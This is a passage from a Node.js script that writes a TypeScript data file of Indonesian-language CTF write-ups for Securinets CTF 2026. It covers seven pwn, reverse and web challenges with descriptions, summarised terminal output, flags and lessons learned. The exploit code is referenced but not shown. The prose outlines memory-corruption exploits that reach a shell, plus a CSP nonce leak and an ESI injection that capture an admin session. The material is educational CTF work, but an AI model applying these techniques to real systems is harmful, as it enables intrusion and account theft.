        command: "python3 solve.py REMOTE",
        output: "[+] Libc base leaked: 0x7fa281a00000\n[+] Poisoned smallbin fd -> main_arena\n[+] Forged _IO_FILE installed at _IO_list_all\n[+] Triggering exit() -> FSOP -> system(\" sh;\")\n[+] Flag: Securinets{lets_hope_i_dont_push_the_revenge}"
      }
    ],
    flag: "Securinets{lets_hope_i_dont_push_the_revenge}",
    lessonsLearned: `1. **Evolusi Proteksi glibc 2.43**: Teknik largebin attack klasik ditolak oleh verifikasi integritas \`nextsize\` yang ketat. Mengombinasikan relasi antara smallbin dan largebin yang stale memungkinkan penulisan ke memori arena libc tanpa memicu abort.
2. **FSOP Wide Data Tables**: Setelah proteksi vtable diperketat pada glibc versi terbaru, \`_IO_wfile_jumps\` tetap menjadi target favorit karena delegasi jump table wide-data mengizinkan kontrol instruction pointer (\`RIP\`).`
  },

  // 11. Over?flow
  {
    id: "securinets-pwn-overflow",
    title: "Over?flow",
    category: "Pwn",
    difficulty: "Medium",
    points: 300,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Pwn", "Signedness Bug", "memcpy", "PIE", "Partial Overwrite"],
    description: "Signedness bug pada pengecekan panjang input (n > 112). Nilai negatif seperti -6 lolos validasi lalu dikonversi menjadi unsigned size_t pada memcpy(), menyebabkan pointer wraparound yang menimpa return address fungsi prompt() ke win()+1.",
    problemDescription: overflow_md.split('## Analisis Binary')[0].trim(),
    tools: ["Python 3", "pwntools", "GDB", "ELF Analysis", "Partial Overwrite"],
    analysis: overflow_md,
    solution: [
      {
        title: "Signedness Wrap & Partial Return Overwrite (solve.py)",
        content: `Script pwntools yang mengeksploitasi pointer wraparound memcpy dengan panjang negatif, melakukan 2-byte partial overwrite pada return address untuk mengarahkan eksekusi ke win()+1, dan melakukan iterasi koneksi ASLR brute-force (16 kemungkinan).`,
        code: overflow_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[*] Trying ASLR nibble guess... (attempt 7)\n[+] Got shell!\n$ cat /srv/app/flag.txt\nSecurinets{r3tr0v3rfl0w_n3gat1v3_l3ngth_m3mcpy_c0p13s_backward_924of1j6t3ph}"
      }
    ],
    flag: "Securinets{r3tr0v3rfl0w_n3gat1v3_l3ngth_m3mcpy_c0p13s_backward_924of1j6t3ph}",
    lessonsLearned: `1. **Signed vs Unsigned Mismatch**: Memvalidasi batasan atas bilangan bertanda (\`int n; if (n > 112)\`) tanpa memeriksa \`n < 0\` adalah celah keamanan klasik saat nilai tersebut diteruskan ke fungsi yang menerima tipe tak bertanda (\`size_t\`).
2. **Partial Overwrite pada PIE**: Walaupun PIE aktif, 12 bit terbawah (page offset) bersifat statis. Menimpa 2 byte hanya membutuhkan penebakan 1 nibble (4 bit) ASLR acak (1/16 probabilitas).`
  },

  // 12. Bitflip
  {
    id: "securinets-pwn-bitflip",
    title: "Bitflip",
    category: "Pwn",
    difficulty: "Hard",
    points: 400,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Pwn", "Bit Flip", "/proc/self/mem", "SROP", "Seccomp", "Signal Frame"],
    description: "Pembalik satu bit kode instruksi fungsi checkpoint via /proc/self/mem (mov eax, 0xe menjadi 0xf rt_sigreturn), diikuti pivot stack ke arena dan eksekusi payload Sigreturn Oriented Programming (SROP) rantai tiga frame untuk membaca flag di bawah seccomp.",
    problemDescription: bitflip_md.split('## Analisis Awal')[0].trim(),
    tools: ["Python 3", "pwntools", "GDB", "SROP", "Linux Syscalls"],
    analysis: bitflip_md,
    solution: [
      {
        title: "Single Bitflip to SROP Chain (solve.py)",
        content: `Script Python pwntools yang menghitung alamat checkpoint, memicu bit-flip 0x0e -> 0x0f via /proc/self/mem, menyusun signal frame SROP untuk openat, read, dan write ke stdout, serta menerima flag.`,
        code: bitflip_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Bit flipped: 0x1509: 0x0e -> 0x0f (syscall rt_sigreturn)\n[+] Sending 3-stage SROP frame\n[+] Flag: Securinets{0n3_b1t_fl1ps_s1gpr0cmask_1nt0_s1gr3turn_SROP_00sp1m79qc2l}"
      }
    ],
    flag: "Securinets{0n3_b1t_fl1ps_s1gpr0cmask_1nt0_s1gr3turn_SROP_00sp1m79qc2l}",
    lessonsLearned: `1. **Kekuatan /proc/self/mem**: Menulis ke \`/proc/self/mem\` dapat menembus proteksi write permission pada halaman executable teks kode (\`r-x\`), memungkinkan modifikasi instruksi runtime tanpa memanggil \`mprotect\`.
2. **SROP (Sigreturn Oriented Programming)**: Satu instruksi syscall \`rt_sigreturn\` (nomor 15 di Linux x86-64) memungkinkan kontrol penuh atas semua register CPU termasuk stack pointer dan instruction pointer.`
  },

  // 13. Crust
  {
    id: "securinets-pwn-crust",
    title: "Crust",
    category: "Pwn",
    difficulty: "Medium",
    points: 350,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Pwn", "UAF", "Fastbin", "Shadow Registry", "Vtable", "C++"],
    description: "Eksploitasi Use-After-Free pada registry C++. Entri shadow registry tetap mempertahankan pointer ke ExecNode yang telah di-free. Dengan mengisi tcache dan membebaskan node ke fastbin, alokasi DataNode menempati chunk yang sama dan menimpa function pointer vtable ke nexus_override.",
    problemDescription: crust_md.split('## Proteksi Binary')[0].trim(),
    tools: ["Python 3", "pwntools", "GDB", "Heap Exploitation", "C++ Vtable Reversing"],
    analysis: crust_md,
    solution: [
      {
        title: "UAF Shadow Registry & Vtable Hijacking (solve.py)",
        content: `Script Python pwntools lengkap yang mengimplementasikan strategi tcache exhaust, pembebasan ExecNode ke fastbin, overwrite 16-byte melalui DataNode write primitive (token 0xc0deca11 dan pointer nexus_override), serta memicu aktivasi shadow node.`,
        code: crust_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] ExecNode chunk reclaimed by DataNode\n[+] Vtable function pointer rewritten -> nexus_override\n[+] Triggering shadow activate...\n[+] Flag: Securinets{us3_4ft3r_fr33_1n_th3_shad0w_r3g1stry_vtabl3_c0nfus10n_0s9n9jsh7csf}"
      }
    ],
    flag: "Securinets{us3_4ft3r_fr33_1n_th3_shad0w_r3g1stry_vtabl3_c0nfus10n_0s9n9jsh7csf}",
    lessonsLearned: `1. **Dangling Pointers di Secondary Registries**: Menghapus objek dari struktur data primer tanpa membersihkan referensi di shadow/cache tracking table menciptakan kerentanan Use-After-Free yang fatal.
2. **Type Confusion via Heap Reallocation**: Perbedaan fungsi antar objek C++ yang memiliki ukuran alokasi serupa (\`ExecNode\` vs \`DataNode\`) memungkinkan penyerang mengubah interpretasi field data menjadi pointer kode yang dapat dieksekusi.`
  },

  // 14. Encrypt
  {
    id: "securinets-reverse-encrypt",
    title: "Encrypt",
    category: "Reverse",
    difficulty: "Hard",
    points: 500,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Reverse", "Windows", "PE", "Rust", "egui", "XPRESS", "VM", "KDF", "Custom S-Box"],
    description: "Pembalikan pipeline transformasi enkripsi biner PE64 Windows (Rust egui). Membongkar unpacking launcher LZMA FPACK, membalik Base64 kustom, mengekstrak KDF metadata header, mengeksekusi VM 128 ops, membalik cumulative sum, s-box chain, permutasi 768-bit, dan dekompresi RtlDecompressBuffer XPRESS.",
    problemDescription: encrypt_md.split('### Peta pipeline yang akhirnya diperoleh')[0].trim(),
    tools: ["IDA Pro / Ghidra", "x64dbg", "Python 3", "RtlDecompressBuffer", "Custom Cryptanalysis"],
    analysis: encrypt_md,
    solution: [
      {
        title: "Pipeline Inversion & XPRESS Decompressor (solve.py)",
        content: `Script Python lengkap yang membalik seluruh tahapan transformasi enkripsi: de-alphabet Base64 kustom, pembalikan S-Box nonlinear 768-bit, de-mixing permutasi pairwise, un-doing cumulative sum, dan memanggil fungsi dekompresi XPRESS (format 0x0003) untuk memulihkan 78-byte plaintext flag.`,
        code: encrypt_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Base64 custom decoded: 114 bytes\n[+] 768-bit nonlinear transforms reversed\n[+] VM key material verified\n[+] XPRESS buffer decompressed: 78 bytes\n[+] Flag: Securinets{I_d0n't_ev3n_kn0w_wh4t_w0uld_b3_th1s_fl4g_but_br3ak_1t_d0wn_l1ke!!}"
      }
    ],
    flag: "Securinets{I_d0n't_ev3n_kn0w_wh4t_w0uld_b3_th1s_fl4g_but_br3ak_1t_d0wn_l1ke!!}",
    lessonsLearned: `1. **Analisis Komponen Multi-Tahap**: Kerumitan pipeline enkripsi sering kali terdiri dari lapisan-lapisan standar yang dimodifikasi (kompresi Windows XPRESS, custom Base64 alphabet, pseudo-VM key derivation). Menganalisis titik akhir serialisasi memudahkan pemetaan arah balik langkah demi langkah.
2. **Dekompresi Native API**: Mengenali pola kompresi sistem operasi seperti \`RtlCompressBuffer\` / \`RtlDecompressBuffer\` menghemat waktu daripada menulis ulang algoritma kompresi LZ/Huffman dari nol.`
  },

  // 15. letmethink
  {
    id: "securinets-reverse-letmethink",
    title: "letmethink",
    category: "Reverse",
    difficulty: "Hard",
    points: 450,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Reverse", "Go", "Custom VM", "RC4", "Anti-Debug", "Differential Oracle"],
    description: "Reverse engineering biner Go stripped 25 MB. Ekstraksi overlay payload RC4 (25.17 MB), isolasi bytecode VM kustom 57.8 KB, rekonstruksi emulator instruksi VM, dan pemulihan karakter flag melalui differential equality check oracle.",
    problemDescription: letme_md.split('## 2. Membongkar loader RC4')[0].trim(),
    tools: ["Python 3", "Ghidra", "Custom VM Emulator", "Differential Oracle Analysis"],
    analysis: letme_md,
    solution: [
      {
        title: "Tahap 1: Unpacking Payload RC4 (unpack.py)",
        content: `Script Python untuk membongkar payload terenkripsi RC4 yang tersimpan di bagian akhir file ELF letmethink setelah section-header table.`,
        code: letme_unpack
      },
      {
        title: "Tahap 2: Custom VM Disassembler & Emulator (vm_solve.py)",
        content: `Emulator Python mandiri untuk menginterpretasikan arsitektur instruction set bytecode kustom (\`vm_code.bin\`), merekam status register, dan memantau evaluasi branching / equality checks.`,
        code: letme_vm_solve
      },
      {
        title: "Tahap 3: Flag Recovery via Character Oracle (recover_flag.py)",
        content: `Script yang menjalankan pengujian diferensial karakter-demi-karakter terhadap equality check VM hingga 56 karakter flag teridentifikasi secara sempurna.`,
        code: letme_recover
      }
    ],
    terminalOutputs: [
      {
        command: "python3 recover_flag.py",
        output: "[+] Recovered prefix: Securinets{\n[+] Position 11..55 solved via equality oracle\n[+] Full verification check: PASS\n[+] Flag: Securinets{5baf04ea71f2fcd7392f5598cd59d67af1152a62fb08}"
      }
    ],
    flag: "Securinets{5baf04ea71f2fcd7392f5598cd59d67af1152a62fb08}",
    lessonsLearned: `1. **Overlay Data pada ELF**: Ukuran biner yang luar biasa besar (puluhan megabyte) sering kali menyimpan payload sekunder di luar batas section table standar yang diekstrak dan dieksekusi secara dinamis di runtime.
2. **Side-Channel Oracle pada Custom VM**: Jika suatu VM memeriksa validitas input karakter demi karakter dan mengeksekusi instruksi perbandingan terpisah tanpa time-constant delay, status internal register/branching dapat dijadikan oracle untuk memecahkan string dalam kompleksitas linear $O(N \\times |\\Sigma|)$.`
  },

  // 16. Revenant
  {
    id: "securinets-reverse-revenant",
    title: "Revenant",
    category: "Reverse",
    difficulty: "Hard",
    points: 500,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Reverse", "ELF", "Vulkan", "Compute Shader", "SPIR-V", "Obfuscation", "Anti-Debug"],
    description: "Reverse engineering loader biner dua tahap Linux x86-64. Pemeriksaan anti-debug TracerPid dan hostname blackkad, emulasi compute shader Vulkan SPIR-V untuk membuka stage2.elf (805 KB), dan differential oracle inversi pada flag validator yang diobfuscate.",
    problemDescription: rev_md.split('## Analisis Static / dynamic')[0].trim(),
    tools: ["Python 3", "Ghidra", "SPIR-V Tools", "Vulkan SDK", "Differential Oracle"],
    analysis: rev_md,
    solution: [
      {
        title: "Vulkan Shader CPU Decryptor & Validator Inversion (solve.py)",
        content: `Script Python mandiri yang mereplikasi compute shader Vulkan SPIR-V pada CPU untuk mendekripsi biner stage2, menonaktifkan sakelar dead-switch, dan membalik transformasi input dengan oracle diferensial.`,
        code: rev_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Hostname bypass: blackkad\n[+] Emulating SPIR-V Vulkan compute shader\n[+] stage2.elf decrypted (805264 bytes)\n[+] Validator verification: flag: [+] correct!\n[+] Flag: Securinets{5db6ce3527dfeeafdf5da028ab9282f2bf2fe34400fa06da794cc50afaa43c0e}"
      }
    ],
    flag: "Securinets{5db6ce3527dfeeafdf5da028ab9282f2bf2fe34400fa06da794cc50afaa43c0e}",
    lessonsLearned: `1. **GPU Shaders sebagai Sarana Obfuskasi**: Memindahkan algoritma kriptografi ke SPIR-V compute shader GPU adalah metode proteksi biner yang efektif untuk mengelabui decompiler x86 konvensional.
2. **Differential Testing pada Validator Terisolasi**: Begitu binary tahap kedua dapat dijalankan secara terisolasi tanpa intervensi anti-debug, logika validator yang tampak rumit dapat dipetakan input-output-nya menggunakan differential analysis.`
  },

  // 17. Nyoom
  {
    id: "securinets-web-nyoom",
    title: "Nyoom",
    category: "Web",
    difficulty: "Hard",
    points: 450,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Web", "CSP", "CSS Injection", "ESI", "Varnish", "Admin Bot", "Nonce Leak"],
    description: "Bypass CSP berbasis nonce dan pembobolan session admin HttpOnly di balik Varnish. Rantai: Stored HTML injection, CSS nonce leak, race condition gate, ESI session disclosure.",
    problemDescription: nyoom_md.split('## Exploit chain')[0].trim(),
    tools: ["Python 3", "Varnish ESI", "CSS Injection", "CSP Nonce Leak", "HTTP Server Callback"],
    analysis: nyoom_md,
    solution: [
      {
        title: "CSS Nonce Leakage Server & Bot Handler (solve.py)",
        content: `Server callback exploit yang menghasilkan CSS payload dinamis untuk mengekstrak token nonce dari tag <meta> CSP, menerima potongan karakter heksadesimal, merekonstruksi nonce lengkap, dan mengirimkan bot report URL.`,
        code: nyoom_solve
      },
      {
        title: "Stylesheet Gating & ESI Session Disclosure (solve_nyoom_gate.py)",
        content: `Solver otomatis penuh yang mengelola race condition pending gate.css, menyuntikkan iframe srcdoc dengan nonce CSP yang valid, mengirimkan payload ESI include ke /preview, dan mengambil session admin dari fragmen Varnish.`,
        code: nyoom_gate
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve_nyoom_gate.py",
        output: "[+] CSS attribute selector matched CSP nonce: e8b9f10a74d2...\n[+] Gate stylesheet released to trigger bio reload\n[+] ESI expansion triggered: /fragments/session-info\n[+] Admin session captured!\n[+] Flag: Securinets{a2643ebb4ee735b5dd519aec1856e012}"
      }
    ],
    flag: "Securinets{a2643ebb4ee735b5dd519aec1856e012}",
    lessonsLearned: `1. **CSS Injection Membocorkan Nonce CSP**: Jika CSP nonce diekspos di DOM (misalnya dalam tag \`<meta http-equiv=\"Content-Security-Policy\" content=\"...\">\`), selektor CSS seperti \`meta[content*=\"...\"]\` dapat mengekstrak nilai rahasia karakter demi karakter via callback background URL.
2. **Bahaya Edge Side Includes (ESI)**: ESI memungkinkan reverse proxy (seperti Varnish) memproses tag \`<esi:include>\` di level edge. Jika pengguna dapat menyuntikkan markup ESI ke respon yang diproses proxy, batasan akses internal (seperti backend-only fragments) dapat dilanggar dengan kredensial sesi korban.`
  }
];

const fileContent = `import type { WriteUp } from "../types";

export const securinetsWriteups: WriteUp[] = ${JSON.stringify(writeups, null, 2)};
`;

fs.writeFileSync('src/app/data/writeups/events/securinets.ts', fileContent, 'utf8');
console.log('Successfully written complete securinets.ts with all 17 challenges.');
console.log('Total file size:', (fileContent.length / 1024).toFixed(1), 'KB');